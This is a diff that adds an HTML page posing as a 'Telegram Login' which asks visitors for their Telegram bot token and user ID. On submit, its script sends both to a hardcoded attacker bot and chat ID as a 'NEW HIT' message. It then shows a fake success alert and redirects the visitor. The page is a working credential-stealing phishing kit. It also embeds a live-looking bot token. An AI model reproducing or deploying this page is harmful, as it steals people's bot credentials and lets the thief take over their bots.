@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Login</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #84fab0, #8fd3f4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 90%;
+    }
+    h2 {
+      text-align: center;
+      color: #2d2d2d;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      background: #f0f0f0;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #28a745;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Telegram Login</h2>
+    <input type="text" id="token" placeholder="Enter Bot Token">
+    <input type="text" id="userid" placeholder="Enter User ID">
+    <button onclick="submitForm()">Done</button>
+  </div>
+
+  <script>
+    function submitForm() {
+      const token = document.getElementById('token').value;
+      const userid = document.getElementById('userid').value;
+
+      if (!token || !userid) {
+        alert("Please fill all fields.");
+        return;
+      }
+
+      const msg = `
+۝۝  𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃  ツ.۝۝ 
+
+🐉 ⊚-----------------------------------⊚ 🐉
+💬 MAIN INFO : 
+📧 ↝Token 
+${token}  
+👤 ↝User ID 
+${userid}  
+🇴 ↝ Country »  Bangladesh 🇧🇩 
+⏳ ↝ Code »  +880 
+🗓 Date: ${new Date().toDateString()}
+⏱ Time: ${new Date().toLocaleTimeString()}
+🌐 IP: 192.168.0.122
+🐉 ⊚-----------------------------------⊚ 🐉
+👨‍💻 Developer :  MD.NAHIDUL ISLAM`;
+
+      // Send to your bot
+      fetch(`https://api.telegram.org/bot7593390316:AAHo1n5FnsJc1MtYgvKFrt7wtoR6UgtFcIc/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: 5316471518,
+          text: msg
+        })
+      }).then(() => {
+        alert("🎉 Congratulation\nNow you can send unlimited message.");
+        localStorage.setItem('token', token);
+        localStorage.setItem('userid', userid);
+        window.location.href = 'message.html';
+      });
+    }
+  </script>
+</body>
+</html>
